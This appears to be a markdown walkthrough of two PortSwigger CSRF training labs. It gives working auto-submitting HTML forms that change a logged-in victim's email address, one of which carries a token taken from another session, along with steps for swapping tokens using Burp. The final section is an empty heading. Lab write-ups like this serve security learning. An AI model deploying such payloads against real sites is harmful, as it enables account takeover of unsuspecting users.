# Cross-site request forgery (CSRF)

Check detail at [here](https://portswigger.net/web-security/csrf)

Type of attack in this example
 - [A relevant action](#a-relevant-action)
 - [Cookie-based session handling](#cookie-based-session-handling)
 - [No unpredictable request parameters](#no-unpredictable-request-parameters)


## A relevant action

[Lab 1](https://portswigger.net/web-security/csrf/lab-no-defenses)

Description of this lab: craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server, we can log in with credentials: `wiener:peter` and this lab's email change functionality is vulnerable to CSRF

We found that when we log in successfully, this has email change field that we can exploit. Moreover, there is an exploit server in this lab, use this HTML in body field

```html
    <form action="https://0a4d00870370bbf4c1d27dfb00060001.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="test&#64;example&#46;com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
```

Clicking store button, then verifying that the exploit works, clicking "View exploit" and check the resulting HTTP request and response. Clicking "Deliver to victim" to solve the lab.

## Cookie-based session handling

[Lab 4](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

Description of this lab: use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address, and two accounts on the application that you can use to help design your attack `wiener:peter; carlos:montoya`

Note: This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

We will need 2 browsers for this lab:
 - Browser 1: log in with `carlos:montoya` and change email, website will generate valid token in payload, like this `email=demo%40demo.demo&csrf=WTvWupXdfWayFeCnkI61Wjz40gY3GaVf`. However, every token can use only one time, so if you want to use token, reload page again. Check the code, and we can see that:

 ```html
    <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
        <label>Email</label>
        <input required="" type="email" name="email" value="">
        <input required="" type="hidden" name="csrf" value="WTvWupXdfWayFeCnkI61Wjz40gY3GaVf">
        <button class="button" type="submit"> Update email </button>
    </form>
 ```

 - Browser 2: log in with `wiener:peter`, send the update email request into Burp Intercept and replace its token by token of browser 1, you can see this modified request changing wiener's email.
 Go back to browser 1, and reload page, copy its token in code, then using this in exploit server with below script.

 ```html
    <form action="https://0a2b005504f730f7c2a8028100f2007c.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="test&#64;example&#46;com">
        <input type="hidden" name="csrf" value="ORVMYq9vt8rwzDakiea2fjBT3kqPT4iy">
    </form>
    <script>
      document.forms[0].submit();
    </script>
 ```

## No unpredictable request parameters

